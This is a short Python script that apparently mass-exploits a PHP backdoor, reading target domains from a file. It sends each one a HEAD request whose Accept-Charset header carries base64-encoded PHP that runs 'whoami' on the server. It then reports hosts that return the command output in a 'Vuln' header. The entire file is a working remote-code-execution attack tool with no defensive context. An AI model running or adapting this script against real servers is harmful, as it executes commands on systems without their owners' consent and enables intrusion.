# -*- coding: utf-8 -*-
# Author: F1tz
#
import requests

headers = {
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Charset': 'aGVhZGVyKCdWdWxuOiAnLmB3aG9hbWlgKTs='
}
for domain in open('domainsList.txt', 'r'):
    try:
        r = requests.head(domain,headers = headers)
        if 'Vuln' in r.headers:
            if r.headers['Vuln'] != '':
                print('[+] %s is Vulnerable, Privilege is [ %s ]' % (domain, r.headers['Vuln']))
    except Exception as e:
        pass
